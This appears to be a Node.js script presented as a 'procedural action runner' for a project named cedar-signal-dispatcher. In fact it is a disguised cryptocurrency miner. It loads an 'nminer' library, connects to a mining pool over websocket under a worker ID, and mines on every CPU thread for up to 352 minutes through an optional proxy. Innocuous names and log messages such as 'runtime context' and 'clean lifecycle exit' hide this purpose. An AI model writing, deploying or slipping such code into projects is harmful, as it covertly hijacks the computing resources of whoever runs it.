// Procedural action runner for cedar-signal-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

function spawnHostDaemon() {
    const instanceToken = "f87f8a";
    console.log(`[worker] Instantiated runtime context for cedar-signal-dispatcher [${instanceToken}]`);

    const runtime = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.cedar-signal-dispatcher",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const tick = () => { setTimeout(tick, 41000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (352m) reached, exiting cleanly.");
        process.exit(0);
    }, 352 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log("[halt] Clean lifecycle exit confirmed.");
        process.exit(0);
    });
}

spawnHostDaemon();
